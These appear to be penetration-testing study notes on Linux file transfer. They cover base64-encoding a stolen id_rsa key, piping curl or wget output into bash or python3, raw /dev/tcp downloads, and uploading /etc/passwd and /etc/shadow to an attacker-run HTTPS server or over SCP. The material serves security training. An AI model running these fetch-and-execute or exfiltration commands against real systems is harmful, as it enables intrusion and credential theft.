### Linux File Transfer Methods

```
# Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. 
# Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.


# Real-case 

...
# A few years ago, we were contacted to perform incident response on some web servers. 
#We found multiple threat actors in six out of the nine web servers we investigated. 
#The threat actor found a SQL Injection vulnerability. 
#They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.

# The Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. 
# Its first attempt was to use cURL. If that failed, it attempted to use wget, and if that failed, it used Python. 
# All three methods use HTTP to communicate.
...

# Although Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses HTTP and HTTPS for communication. 
```

## Download Operations

### Base64 Encoding / Decoding

```
# Depending on the file size we want to transfer, we can use a method that does not require network communication. 
# If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation.

md5sum id_rsa                                       # Check File MD5 hash (e.g. on target host)
output:
4e301756a07ded0a2dd6953abf015278  id_rsa

cat id_rsa |base64 -w 0;echo                        # Encode id_rsa key with base64 (on target host)
output:
LS0tLS1CRUdJT...=
echo -n 'LS0tLS1CRUdJT...=' | base64 -d > id_rsa    # Decode key with base64 (on localhost)

md5sum id_rsa                                       # Check again with MD5 (on lacalhost)

4e301756a07ded0a2dd6953abf015278  id_rsa

```

### Web Downloads with Wget and cURL

```
# Two of the most common utilities in Linux distributions to interact with web applications are wget and curl. 
# These tools are installed on many Linux distributions.

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh     # Download a File Using wget
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh     # Download a File Using cURL

```

### Fileless Attacks Using Linux

```
# Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, 
# which means that we don't have to download a file to execute it.

# Note: 
# Some payloads such as mkfifo write files to disk. 
# Keep in mind that while the execution of the payload may be fileless when you use a pipe, 
# depending on the payload chosen it may create temporary files on the OS.

# Let's take the cURL command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe:

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash                 # Fileless Download with cURL

# Similarly, we can download a Python script file from a web server and pipe it into the Python binary. 
# Let's do that, this time using wget:

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3    # Fileless Download/execute with wget
output:
Hello World!
```

### Download with Bash (/dev/tcp)

```
# There may also be situations where none of the well-known file transfer tools are available. 
# As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), 
# the built-in /dev/TCP device file can be used for simple file downloads.

exec 3<>/dev/tcp/10.10.10.32/80                 # Connect to the Target Webserver
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3       # HTTP GET Request
cat <&3                                         # Print the Response
```

### Print the Response

```
# SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
# SCP (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. 
# We can copy our files from local to remote servers and from remote servers to our local machine.

sudo systemctl enable ssh                # Enabling the SSH Server
sudo systemctl start ssh                 # Starting the SSH Server
netstat -lnpt                            # Checking for SSH Listening Port

# Now we can begin transferring files. 
# We need to specify the IP address of our localhost and the username and password.

scp plaintext@192.168.49.128:/root/myroot.txt .            # Linux - Downloading Files Using SCP

# Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
```

## Upload Operations

### Web Upload

```
# As mentioned in the Windows File Transfer Methods section, we can use uploadserver, 
# an extended module of the Python HTTP.Server module, which includes a file upload page. 
# For this Linux example, let's see how we can configure the uploadserver module to use HTTPS for secure communication.

sudo python3 -m pip install --user uploadserver        #  install the uploadserver module.
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'     # Create a Self-Signed Certificate

mkdir https && cd https                                               # Create server folder
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem    # Start Web Upload Server

curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure       # Upload files from target hos to localhost

# We used the option --insecure because we used a self-signed certificate that we trust.
```

### Alternative Web File Transfer Method

```
# If the server we compromised is a web server, 
# we can move the files we want to transfer to the web server directory and access them from the web page, 
# which means that we are downloading the file from our localhost. (?)

# It is possible to stand up a web server using various languages. 
# A compromised Linux machine may not have a web server installed. 
# In such cases, we can use a mini web server. 
# What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.

python3 -m http.server          # Creating a Web Server with Python3

python2.7 -m SimpleHTTPServer   # Creating a Web Server with Python2.7

php -S 0.0.0.0:8000             # Creating a Web Server with PHP

ruby -run -ehttpd . -p8000      # Creating a Web Server with Ruby

wget 192.168.49.128:8000/filetotransfer.txt   Download the File from the Target Machine to localhost (?)

# Note: 
# When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. 
# We are transferring a file from our target onto our attack host, but we are not uploading the file.
```

### SCP Upload

```
# We may find some companies that allow the SSH protocol (TCP/22) for outbound connections, 
# and if that's the case, we can use an SSH server with the scp utility to upload files. 
# Let's attempt to upload a file to the target machine using the SSH protocol.

scp /etc/passwd user-student@10.129.86.90:/home/user-student/             # File Upload using SCP
```
